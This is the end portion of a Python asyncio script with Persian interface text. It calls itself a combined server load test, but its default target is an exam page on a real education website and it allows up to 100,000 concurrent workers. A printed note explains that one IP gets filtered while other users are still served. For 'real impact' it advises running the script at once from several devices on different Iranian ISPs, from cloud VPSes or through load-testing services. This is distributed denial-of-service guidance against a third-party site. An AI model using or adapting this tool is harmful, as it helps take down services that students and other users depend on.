        print(f"  │ {'ثانیه':>6} │ {'ورکر':>5} │ {'RPS':>6} │ {'🔐':>5} │ {'📄':>5} │ {'🖼️':>4} │ {'RL':>4}")
        print(f"  │ {'─'*6} │ {'─'*5} │ {'─'*6} │ {'─'*5} │ {'─'*5} │ {'─'*4} │ {'─'*4}")
        for s in snaps:
            rl_c = C.R if s['rl'] > 0 else C.G
            print(f"  │ {s['t']:6.0f} │ {s['users']:5d} │ {s['rps']:6.1f} │ {s['logins']:5d} │ {s['pages']:5d} │ {s['resources']:4d} │ {rl_c}{s['rl']:4d}{C.RS}")
        print(f"  └────────────────────────────────────────────────────")

    # ── نکته مهم ──
    print(f"\n  ┌─{C.BD}{C.Y} نکته مهم درباره تأثیر واقعی {C.RS}──────────────────────────────")
    print(f"  │")
    print(f"  │ {C.BD}چرا سایت برای بقیه هنوز باز میشه؟{C.RS}")
    print(f"  │")
    print(f"  │ تمام درخواست‌ها از {C.R}یک IP{C.RS} و {C.R}یک کامپیوتر{C.RS} میان.")
    print(f"  │ سرورها و CDNها ترافیک مشکوک از یک IP رو فیلتر میکنن")
    print(f"  │ ولی به بقیه کاربران سرویس میدن.")
    print(f"  │")
    print(f"  │ {C.G}برای تأثیر واقعی:{C.RS}")
    print(f"  │ 1️⃣ از {C.BD}چند دستگاه{C.RS} با {C.BD}اینترنت مختلف{C.RS} همزمان اجرا کنید")
    print(f"  │    (مثلاً: ایرانسل + مخابرات + شاتل موبایل)")
    print(f"  │ 2️⃣ از VPS ابری استفاده کنید (Hetzner, Contabo)")
    print(f"  │ 3️⃣ از ابزار Loader.io یا k6 Cloud استفاده کنید")
    print(f"  │")
    print(f"  │ {C.Y}مثال:{C.RS} ۵ نفر × ۳۰۰۰ ورکر = ۱۵,۰۰۰ از ۵ IP مختلف")
    print(f"  │      {C.Y}≫{C.RS} ۱ نفر × ۵۰۰,۰۰۰ ورکر = از ۱ IP (فقط خودت کریش میشی!)")
    print(f"  │")
    print(f"  └────────────────────────────────────────────────────")
    print(f"\n{'═'*72}\n")


# ═══════════════════════════════════════════════════════════════════════════════
# تنظیمات
# ═══════════════════════════════════════════════════════════════════════════════

DEFAULT_URL = "https://behsamooz.ir/student/run-descriptive-exam/dbe11389-6684-44d6-a2ce-8022f49a889b"
DEFAULT_MAX = 100000         
DEFAULT_SAFE_MAX = 100000   
DEFAULT_STEP = 500
DEFAULT_STEP_DUR = 3


def parse_args():
    p = argparse.ArgumentParser(description="تست ترکیبی بار سرور")
    p.add_argument("--url", default=DEFAULT_URL)
    p.add_argument("--max-workers", type=int, default=DEFAULT_MAX)
    p.add_argument("--step", type=int, default=DEFAULT_STEP)
    p.add_argument("--step-duration", type=int, default=DEFAULT_STEP_DUR)
    p.add_argument("--timeout", type=int, default=20)
    p.add_argument("--safe-max", type=int, default=DEFAULT_SAFE_MAX,
                   help="سقف ایمن ورکرها (جلوگیری از کریش سیستم)")
    return p.parse_args()


async def main():
    args = parse_args()

    print(f"\n  {C.CY}🎯 هدف فعلی: {C.W}{args.url}{C.RS}")
    print(f"  {C.CY}⌨  اگر می‌خواهید هدف را تغییر دهید، URL جدید را وارد کنید و Enter بزنید.")
    print(f"     (برای استفاده از هدف فعلی، فقط Enter بزنید){C.RS}")
    
    try:
        user_input = input(f"  {C.BD}>{C.RS} ").strip()
        target_url = user_input if user_input else args.url
    except KeyboardInterrupt:
        return

    if not target_url.startswith("http"):
        print(f"\n  {C.R}❌ خطا: آدرس باید با http یا https شروع شود.{C.RS}")
        return

    tester = CombinedTester(
        login_url=target_url,
        timeout=args.timeout,
        safe_max=args.safe_max,
    )

    if sys.platform != "win32":
        try:
            loop = asyncio.get_event_loop()
            for sig in (signal.SIGINT, signal.SIGTERM):
                loop.add_signal_handler(sig, tester.stop)
        except Exception:
            pass

    try:
        await tester.run(
            max_workers=args.max_workers,
            step=args.step,
            step_dur=args.step_duration,
        )
    except KeyboardInterrupt:
        tester.stop()
        print(f"\n\n  {C.Y}⚠ Ctrl+C{C.RS}")
    except Exception as e:
        print(f"\n  {C.R}❌ {e}{C.RS}")
    finally:
        report(tester.stats, target_url, tester._snaps)


if __name__ == "__main__":
    asyncio.run(main())
